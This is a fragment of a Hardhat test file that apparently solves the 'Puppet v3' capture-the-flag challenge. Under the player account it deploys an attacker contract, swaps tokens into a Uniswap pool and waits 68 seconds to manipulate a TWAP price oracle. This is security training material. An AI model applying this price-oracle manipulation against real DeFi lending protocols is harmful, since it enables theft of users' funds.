...
describe('[Challenge] Puppet v3', function () {
    ...
    /** SET RPC URL HERE */
    const MAINNET_FORKING_URL = "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161";
    ...
    it('Execution', async function () {
        const AttackerContractFactory = await ethers.getContractFactory('AttackerPuppetV3', player);
        attacker = await AttackerContractFactory.deploy(
            token.address,
            uniswapPool.address
        );

        await token.connect(player).approve(attacker.address, ethers.constants.MaxUint256);
        
        await attacker.connect(player).swap(player.address, PLAYER_INITIAL_TOKEN_BALANCE);

        await time.increase(68); //empirical minimum delay for TWAP manipulation
